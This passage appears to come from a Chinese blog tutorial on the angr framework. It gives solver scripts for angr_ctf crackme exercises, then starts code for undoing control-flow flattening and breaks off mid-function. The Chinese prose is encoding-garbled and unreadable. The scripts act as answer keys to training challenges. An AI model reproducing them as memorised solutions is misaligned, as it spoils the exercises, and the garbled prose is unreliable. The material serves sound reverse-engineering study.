<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;12_angr_veritesting&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    start = <span class="number">0x0</span></span><br><span class="line">    state = proj.factory.entry_state()</span><br><span class="line">    simgr = proj.factory.simgr(state, veritesting = <span class="literal">True</span>)</span><br><span class="line">    simgr.explore(find = <span class="number">0x8048635</span>)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        now_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">complex_function</span>(<span class="params">a1, a2</span>):</span><br><span class="line">            <span class="keyword">return</span> (a1 - <span class="number">65</span> + <span class="number">2</span> * a2) % <span class="number">26</span> + <span class="number">65</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            ans = now_state.memory.load(now_state.regs.ebp.args[<span class="number">0</span>] - <span class="number">0x2d</span> + i, <span class="number">1</span>)</span><br><span class="line">            now_state.add_constraints(ans == complex_function(<span class="number">75</span>, i + <span class="number">93</span>))</span><br><span class="line">            <span class="built_in">print</span>(now_state.solver.<span class="built_in">eval</span>(ans, cast_to=<span class="built_in">bytes</span>).decode(), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-static-binary-é™æ€ç¼–è¯‘ç¨‹åºçš„ç¬¦å·æ‰§è¡Œ"><a href="#angr-static-binary-é™æ€ç¼–è¯‘ç¨‹åºçš„ç¬¦å·æ‰§è¡Œ" class="headerlink" title="angr_static_binary | é™æ€ç¼–è¯‘ç¨‹åºçš„ç¬¦å·æ‰§è¡Œ"></a>angr_static_binary | é™æ€ç¼–è¯‘ç¨‹åºçš„ç¬¦å·æ‰§è¡Œ</h3><p>å¦‚æœç¨‹åºæ˜¯é™æ€ç¼–è¯‘å‡ºæ¥çš„ angrå°±ä¼šæŠŠåº“å‡½æ•°å½“æˆç”¨æˆ·å‡½æ•° åœ¨ç¬¦å·æ‰§è¡Œçš„æ—¶å€™ä¼šè¿›å…¥åº“å‡½æ•°è¿›è¡Œå®Œå…¨çš„ç¬¦å·æ‰§è¡Œ ç›¸å½“äºæ­¥å…¥è°ƒè¯• ä»¥å‰è¯†åˆ«å‡ºåº“å‡½æ•°ä½¿ç”¨çš„æ˜¯æ­¥è¿‡è°ƒè¯• è¿™æ—¶å€™å°±éœ€è¦hookè¿™äº›é™æ€ç¼–è¯‘è¿›ç¨‹åºçš„åº“å‡½æ•° æ›¿æ¢æˆangrè‡ªå¸¦çš„åº“å‡½æ•°:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;13_angr_static_binary&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    start = <span class="number">0x0</span></span><br><span class="line">    state = proj.factory.entry_state()</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    proj.hook(<span class="number">0x8048D10</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__libc_start_main&#x27;</span>]())</span><br><span class="line">    proj.hook(<span class="number">0x804ED40</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;printf&#x27;</span>]())</span><br><span class="line">    proj.hook(<span class="number">0x804ED80</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__isoc99_scanf&#x27;</span>]())</span><br><span class="line">    proj.hook(<span class="number">0x8048280</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;strcmp&#x27;</span>]())</span><br><span class="line">    proj.hook(<span class="number">0x804F350</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;puts&#x27;</span>]())</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<p>hookçš„åœ°å€å°±ç”¨åº“å‡½æ•°çš„èµ·å§‹åœ°å€ åŒºåˆ†æ˜¯glibcè¿˜æ˜¯libcçš„å‡½æ•°çœ‹å‰é¢æœ‰æ²¡æœ‰ä¸¤ä¸ªä¸‹åˆ’çº¿å°±è¡Œ</p>
<h3 id="angr-shared-library-ç¬¦å·æ‰§è¡ŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°"><a href="#angr-shared-library-ç¬¦å·æ‰§è¡ŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°" class="headerlink" title="angr_shared_library | ç¬¦å·æ‰§è¡ŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°"></a>angr_shared_library | ç¬¦å·æ‰§è¡ŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°</h3><p>angrçš„å¥½å¤„å°±æ˜¯å¯ä»¥è®¾å®šåˆå§‹æ¡ä»¶ç›´æ¥ç¬¦å·æ‰§è¡Œä¸€æ®µä»£ç  è€Œä¸ç”¨åƒè°ƒè¯•å™¨ä¸€æ ·å¦‚æœæ˜¯åº“çš„è¯è¦é™„åŠ åˆ°ç¨‹åºä¸Šæ‰èƒ½è°ƒè¯• è¿™é¢˜è¦ç¬¦å·æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨åº“çš„å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 14_angr_shared_library</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [esp+1Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( validate((<span class="type">int</span>)s, <span class="number">8</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// lib14_angr_shared_library.so</span></span><br><span class="line"></span><br><span class="line">_BOOL4 __cdecl <span class="title function_">validate</span><span class="params">(<span class="type">char</span> *s1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">20</span>]; <span class="comment">// [esp+4h] [ebp-24h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">7</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">    s2[i] = <span class="number">0</span>;</span><br><span class="line">  qmemcpy(s2, <span class="string">&quot;PVBLVTFT&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = &amp;s1[j];</span><br><span class="line">    *v3 = complex_function(s1[j], j);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(s1, s2) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŠ è½½åº“éœ€è¦æŒ‡å®šåŸºå€ è¿™é‡Œé€‰<code>base = 0x4000000</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">base = <span class="number">0x4000000</span></span><br><span class="line">func_offset = <span class="number">0x6D7</span></span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;lib14_angr_shared_library.so&#x27;</span>, load_options=&#123;</span><br><span class="line">    <span class="string">&#x27;main_opts&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;custom_base_addr&#x27;</span>: base</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>ä¸ºäº†è®¾å®šå‡½æ•°æ‰§è¡Œçš„åˆå§‹å€¼éœ€è¦ä¸€ä¸ªcall_stateæ¥æŒ‡å®šå‡½æ•°èµ·å§‹åœ°å€å’Œå‚æ•° è¿™é‡Œå‡å®šç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²å­˜æ”¾åœ°å€æ˜¯0x3000000:</p>
<p><code>state = proj.factory.call_state(base + func_offset, 0x3000000, 8)</code></p>
<p>åé¢çš„æµç¨‹å°±å’Œç¬¦å·æ‰§è¡Œæ™®é€šçš„ç¨‹åºä¸€æ ·äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    base = <span class="number">0x4000000</span></span><br><span class="line">    func_offset = <span class="number">0x6D7</span></span><br><span class="line"></span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;lib14_angr_shared_library.so&#x27;</span>, load_options=&#123;</span><br><span class="line">        <span class="string">&#x27;main_opts&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;custom_base_addr&#x27;</span>: base</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    state = proj.factory.call_state(base + func_offset, <span class="number">0x3000000</span>, <span class="number">8</span>)</span><br><span class="line">    pw = claripy.BVS(<span class="string">&#x27;pw&#x27;</span>, <span class="number">8</span> * <span class="number">8</span>)</span><br><span class="line">    state.memory.store(<span class="number">0x3000000</span>, pw)</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find = base + <span class="number">0x783</span>)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        new_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">        new_state.add_constraints(new_state.regs.eax == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(new_state.solver.<span class="built_in">eval</span>(pw, cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h2 id="ç”¨Angrå®ç°å»æ§åˆ¶æµå¹³å¦åŒ–"><a href="#ç”¨Angrå®ç°å»æ§åˆ¶æµå¹³å¦åŒ–" class="headerlink" title="ç”¨Angrå®ç°å»æ§åˆ¶æµå¹³å¦åŒ–"></a>ç”¨Angrå®ç°å»æ§åˆ¶æµå¹³å¦åŒ–</h2><p>å¼€å·¥ä¹‹å‰å…ˆç®€å•äº†è§£ä¸€ä¸‹<a href="https://security.tencent.com/index.php/blog/msg/112">æ§åˆ¶æµå¹³å¦åŒ–çš„åŸç†</a> å»å¹³å¦åŒ–çš„æ ¸å¿ƒä»»åŠ¡å°±æ˜¯æ¢å¤å„ä¸ª<strong>çœŸå®å—(relevant block)</strong> å³åŸç¨‹åºä¸­å°±æœ‰çš„å—ä¹‹é—´çš„è”ç³» è€Œç”¨Angrå®Œæˆè¿™é¡¹ä»»åŠ¡çš„éš¾ç‚¹æœ‰:</p>
<ol>
<li><p>angrè‡ªå¸¦çš„å—å¯¹è±¡ä¸IDAä¸­graph viewçš„blockæœ‰åŒºåˆ« angräº§ç”Ÿçš„æ§åˆ¶æµå›¾(ControlFlow Graph, CFG)ä¼šè¢«<code>call</code>æŒ‡ä»¤åˆ†å‰² è€ŒIDAä¸­çš„å—ç›´åˆ°è·³è½¬æ‰ä¼šç»“æŸä¸€ä¸ªå— å¹¸è¿çš„æ˜¯å®˜æ–¹çš„é™„å¸¦ç»„ä»¶åº“<code>angr_management</code>ä¸­æœ‰ä¸€ä¸ªè½¬åŒ–angr CFGä¸ºIDA CFGçš„å‡½æ•° ä½†æ˜¯åŒæ—¶ä¹Ÿå¸¦æ¥äº†ç¬¬äºŒä¸ªé—®é¢˜</p>
</li>
<li><p>angr_managementä¸­çš„to_supergraphäº§ç”Ÿçš„IDA CFGå®é™…ä¸Šæ˜¯networkxåº“ä¸­çš„DI-Graph(æœ‰å‘å›¾)ç±»çš„æ´¾ç”Ÿç±» ç›¸æ¯”angr CFG å¯æ“ä½œæ€§ç›´çº¿ä¸‹é™</p>
</li>
<li><p>å¯¹åŸæ¥äº§ç”Ÿåˆ†æ”¯çš„å—çš„å¤„ç†</p>
</li>
</ol>
<p>è¿™é‡Œä¸€æ­¥æ­¥åœ°è¿›è¡Œå»å¹³å¦åŒ–å¹¶åœ¨é‡åˆ°è¿™äº›é—®é¢˜æ—¶è¿›è¡Œè§£é‡Š</p>
<h3 id="è·å–å„ç§å—ä»¥æ–¹ä¾¿åç»­çš„æ“ä½œ"><a href="#è·å–å„ç§å—ä»¥æ–¹ä¾¿åç»­çš„æ“ä½œ" class="headerlink" title="è·å–å„ç§å—ä»¥æ–¹ä¾¿åç»­çš„æ“ä½œ"></a>è·å–å„ç§å—ä»¥æ–¹ä¾¿åç»­çš„æ“ä½œ</h3><p>è¿™é‡Œå°±è¦å‘æŒ¥IDA CFGçš„ä¼˜åŠ¿äº† æ ¹æ®ä¸Šæ–‡å¼•ç”¨çš„èµ„æ–™ å„ä¸ªå—ä¹‹é—´çš„ç•Œé™ä»¥åŠå„è‡ªçš„ç‰¹å¾(ä»¥æœ‰å‘å›¾çš„è§†è§’çœ‹ ç‰¹å¾å°±æ˜¯ä¸€ä¸ªå—çš„in-degreeå’Œout-degree)è¿˜æ˜¯éå¸¸æ˜æ˜¾çš„:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F08%2F10%2F20240810-222100.png" alt="image-20240810222053426"></p>
<p>å°†angr CFGå˜æˆIDA CFGåæ ¹æ®ç‰¹å¾æ±‡æ€»æ¯ç§å—:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Get_CFG</span>(<span class="params">proj : angr.Project</span>):</span><br><span class="line">    cfg = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cfg = proj.analyses.CFGFast(normalize=<span class="literal">True</span>, force_complete_scan=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        cfg = proj.analyses.CFGFast(normalize=<span class="literal">True</span>)</span><br><span class="line">    addr = <span class="built_in">int</span>(args.addr, <span class="number">16</span>) <span class="keyword">if</span> args.addr != <span class="string">&#x27;main&#x27;</span> <span class="keyword">else</span> args.addr</span><br><span class="line">    cfg = cfg.functions[addr].transition_graph</span><br><span class="line">    IDA_cfg = graph.to_supergraph(cfg) </span><br><span class="line">    <span class="keyword">return</span> IDA_cfg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_Blocks</span>(<span class="params">cfg</span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">    blocks = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> cfg.nodes():</span><br><span class="line">        <span class="keyword">if</span> cfg.in_degree(node) == <span class="number">0</span>:</span><br><span class="line">            blocks[<span class="string">&#x27;entry&#x27;</span>] = node</span><br><span class="line">        <span class="keyword">elif</span> cfg.out_degree(node) == <span class="number">0</span>:</span><br><span class="line">            blocks[<span class="string">&#x27;exit&#x27;</span>] = node</span><br><span class="line">    blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>] = <span class="built_in">list</span>(cfg.successors(blocks[<span class="string">&#x27;entry&#x27;</span>]))[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> cfg.predecessors(blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>]):</span><br><span class="line">        <span class="keyword">if</span> cfg.in_degree(node) != <span class="number">0</span>:</span><br><span class="line">            blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>] = node</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    blocks[<span class="string">&#x27;relevant&#x27;</span>] = [blocks[<span class="string">&#x27;entry&#x27;</span>]] + [node <span class="keyword">for</span> node <span class="keyword">in</span> cfg.predecessors(blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>]) <span class="keyword">if</span> cfg.in_degree(node) == <span class="number">1</span>] + [blocks[<span class="string">&#x27;exit&#x27;</span>]]</span><br><span class="line">    blocks[<span class="string">&#x27;irrelevant&#x27;</span>] = [node <span class="keyword">for</span> node <span class="keyword">in</span> cfg.nodes() <span class="keyword">if</span> node <span class="keyword">not</span> <span class="keyword">in</span> blocks[<span class="string">&#x27;relevant&#x27;</span>] <span class="keyword">and</span> node != blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>] <span class="keyword">and</span> node != blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>]]</span><br><span class="line">    <span class="keyword">return</span> blocks</span><br></pre></td></tr></table></figure>

<h3 id="è·å–çœŸå®å—çš„è¯¦ç»†ä¿¡æ¯"><a href="#è·å–çœŸå®å—çš„è¯¦ç»†ä¿¡æ¯" class="headerlink" title="è·å–çœŸå®å—çš„è¯¦ç»†ä¿¡æ¯"></a>è·å–çœŸå®å—çš„è¯¦ç»†ä¿¡æ¯</h3><p>è¿™ä¸€æ­¥çš„ç›®çš„æ˜¯ä¸ºä¸‹ä¸€æ­¥é‡å»ºçœŸå®å—ä¹‹é—´çš„è”ç³»åšé“ºå« çœŸå®å—åœ¨åŸç¨‹åºä¸­æœ€å¤šæœ‰ä¸¤ä¸ªout-degree ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œè¦å¯¹çœŸå®å—è¿›è¡Œåˆ†ç±» æœ€ç®€å•çš„å°±æ˜¯æ²¡æœ‰in-degreeå’Œæ²¡æœ‰out-degreeçš„å…¥å£å’Œç»ˆæ­¢å— å‰©ä¸‹çš„ç¨‹åºå†…å®¹å¯ä»¥åˆ†ä¸ºæœ‰åˆ†æ”¯å’Œæ— åˆ†æ”¯çš„çœŸå®å— ç¨å¾®äº†è§£ä¸€ä¸‹(x86_64)æ§åˆ¶æµå¹³å¦åŒ–çš„å®ç°å°±èƒ½å‘ç° åŸæœ¬çš„<code>jx</code>è·³è½¬éƒ½éœ€è¦è½¬åŒ–ä¸ºå¯¹å¯¹æ•´ä¸ªæ§åˆ¶æµèµ·å†³å®šæ€§çš„å…³é”®å€¼çš„åˆ†æ”¯åŒ–èµ‹å€¼ å…·ä½“å®ç°å°±æ˜¯é‡‡ç”¨<code>cmovxx</code>æŒ‡ä»¤:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F08%2F10%2F20240810-223042.png" alt="image-20240810222920030"></p>
<p><code>cmovxx</code>æŒ‡ä»¤ä¼šæ ¹æ®zf, sfç­‰æ ‡å¿—ä½æ¥å¯¹æºå¯„å­˜å™¨è¿›è¡Œèµ‹å€¼ ä¾‹å¦‚cmovzä¼šåœ¨zf&#x3D;1æ—¶æ‰§è¡Œmov eax, ecxåä¹‹ä»€ä¹ˆä¹Ÿä¸å¹² åœ¨ç¡®å®šæ¡†æ¶çš„å‰æä¸‹ç”¨angr CFGè‡ªå¸¦çš„<code>.capstone.ins</code>æ–¹æ³•æ¥è·å–æ±‡ç¼–æŒ‡ä»¤ å¹¶ç”¨æ±‡ç¼–æŒ‡ä»¤æ¥åˆ¤æ–­è¯¥å—æ˜¯å¦ä¼šäº§ç”Ÿåˆ†æ”¯ è¿™é‡Œå°±ä¼šä½“ç°ç¬¬1, 2ç‚¹çš„ç¼ºé™·äº† å› ä¸ºç”¨IDA CFGåˆ›å»ºçš„çœŸå®å—å¦‚æœè°ƒç”¨æŸå‡½æ•°çš„è¯ åœ¨å¯¹åº”çš„angr CFGä¸­ä¼šæ˜¯åˆ†éš”çš„ä¸€ä¸ªæˆ–å‡ ä¸ªå— è¿™é‡Œç”¨é€’å½’çš„æ–¹æ³•æ‰¾åˆ°angr CFGä¸­åŒ…å«<code>jmp</code>æŒ‡ä»¤çš„å—æ¥ä¿è¯å·²ç»åˆ†æå®Œä¸€ä¸ªå®Œæ•´IDA CFGå—</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Get_branch</span>(<span class="params">block_addr, all_branches, target, _<span class="keyword">from</span>=<span class="literal">None</span>, flag=<span class="literal">False</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="comment"># This function is used to get the address where the branch is located with it&#x27;s type and the address of the end of the block</span></span><br><span class="line">    <span class="keyword">if</span> _<span class="keyword">from</span> <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        _<span class="keyword">from</span> = block_addr</span><br><span class="line">        all_branches[_<span class="keyword">from</span>] = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">    block = proj.factory.block(block_addr)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">NOP</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    block_ins = block.capstone.insns</span><br><span class="line">    <span class="keyword">for</span> ins <span class="keyword">in</span> block_ins:</span><br><span class="line">        <span class="keyword">if</span> ins.mnemonic == <span class="string">&#x27;call&#x27;</span>:</span><br><span class="line">            <span class="comment"># Hook all calls to avoid errors in the CFG(too deep recursion)</span></span><br><span class="line">            proj.hook(ins.address, hook=NOP, length=ins.size)</span><br><span class="line">        <span class="keyword">elif</span> ins.mnemonic.startswith(<span class="string">&#x27;cmov&#x27;</span>):</span><br><span class="line">            all_branches[_<span class="keyword">from</span>][<span class="number">0</span>], all_branches[_<span class="keyword">from</span>][<span class="number">1</span>] = ins.address, ins.mnemonic</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> ins.mnemonic == <span class="string">&#x27;jmp&#x27;</span> <span class="keyword">or</span> ins.mnemonic == <span class="string">&#x27;retn&#x27;</span>:</span><br><span class="line">        all_branches[_<span class="keyword">from</span>].append(ins.address)</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> Get_branch(ins.address + ins.size, all_branches, target, _<span class="keyword">from</span>, flag)</span><br></pre></td></tr></table></figure>

<p> æœ€å<code>all_branches</code>å°±ä¼šåŒ…å«æ‰€æœ‰çœŸå®å—çš„3ä¸ªä¿¡æ¯:èµ·å§‹åœ°å€, åˆ†æ”¯ç±»å‹(è‹¥æ²¡æœ‰åˆ™ä¸ºNone), ç»“æŸåœ°å€ åœ¨åé¢çš„æ¢å¤æ§åˆ¶æµä¸­ä¼šç”¨åˆ°</p>
<h3 id="é‡å»ºæ§åˆ¶æµ"><a href="#é‡å»ºæ§åˆ¶æµ" class="headerlink" title="é‡å»ºæ§åˆ¶æµ"></a>é‡å»ºæ§åˆ¶æµ</h3><p>æ¥ä¸‹æ¥åªéœ€è¦æ ¹æ®åˆ†æ”¯ç±»å‹æ¥ç¡®å®šçœŸå®å—é—´çš„å…³ç³»å°±ç®—æ˜¯åŸºæœ¬å®Œæˆä»»åŠ¡äº† ä½†æ˜¯éš¾ç‚¹ä¹Ÿæ¥äº† åŸæœ¬æˆ‘çš„æƒ³æ³•æ˜¯ä¸é‡‡ç”¨ä»¥çœŸå®å—ä½œä¸ºèµ·ç‚¹çš„å®½æœæ–¹å¼ è€Œæ˜¯ä»å…¥å£å—å¼€å§‹æ‰§è¡Œ æœŸå¾…angrçš„ç¬¦å·æ‰§è¡Œä¼šåœ¨<code>cmovxx</code>æŒ‡ä»¤è‡ªåŠ¨åˆ†ç¦»å‡ºä¸¤ä¸ª<code>active</code> ç„¶ååªè¦ä¸æ–­ä½¿ç”¨<code>step()</code>æ–¹æ³•ç›´åˆ°<code>active.addr</code>å‡ºç°åœ¨çœŸå®å—çš„èµ·å§‹åœ°å€é‡Œå°±èƒ½è½»æ¾è·å–æ§åˆ¶æµ ä½†æ˜¯angråªä¼šåœ¨è·³è½¬äº§ç”Ÿåˆ†æ”¯ æ ¹æœ¬ä¸é¸Ÿæˆ‘ å®Œå…¨æ²¡æœ‰äº§ç”Ÿåˆ†æ”¯ <strong>ä¼¼äº†</strong></p>
<p>ç„¶åæˆ‘çš„æƒ³æ³•æ˜¯æ ¹æ®åˆ†æ”¯ç±»å‹æ¥è®¾ç½®sf, zfç­‰æ ‡å¿—ä½ æ‰‹åŠ¨äº§ç”Ÿä¸¤æ¡active ä½†æ˜¯angræœ¬æ¥è®¾è®¡æ¥å°±æ˜¯éå†æ‰€æœ‰å¯èƒ½çš„è·³è½¬çš„ æ ¹æœ¬æ²¡æœ‰æ ‡å¿—ä½ <strong>åˆä¼¼äº†</strong></p>
<p>æœ€ååœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ä¸€ç§æ–¹æ³• é€šè¿‡æ§åˆ¶angråº•å±‚çš„vex IRçš„æ‰§è¡Œæ¥è¾¾åˆ°ä¸Šé¢ç¬¬äºŒç§å°è¯•çš„ç›®çš„:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Get_successors</span>(<span class="params">node, targets : <span class="built_in">list</span>, branch_sign=<span class="literal">None</span>, cond=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> branch_sign <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        state = proj.factory.blank_state(addr=node.addr, remove_options=&#123;angr.sim_options.LAZY_SOLVES&#125;)</span><br><span class="line">        simgr = proj.factory.simulation_manager(state)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            simgr.step()</span><br><span class="line">            <span class="keyword">if</span> simgr.active[<span class="number">0</span>].addr <span class="keyword">in</span> targets:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> simgr.active[<span class="number">0</span>].addr</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">apply_branch</span>(<span class="params">state</span>):</span><br><span class="line">            expressions = <span 